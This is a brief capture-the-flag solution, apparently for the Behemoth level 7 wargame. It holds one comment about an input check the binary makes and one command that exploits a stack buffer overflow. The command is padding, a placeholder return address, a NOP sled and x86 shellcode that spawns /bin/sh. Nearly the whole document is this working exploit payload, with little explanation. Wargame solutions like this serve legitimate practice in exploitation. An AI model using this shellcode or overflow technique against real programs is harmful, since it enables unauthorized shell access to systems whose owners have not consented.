#using a decompiler we can notice the binary is checking if there is any non alphanum bytes in the first 512 bytes of the input
./behemoth7 $(python -c "print 528 * 'A' + 'addr_inside_nopsled' + 200 * '\x90' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
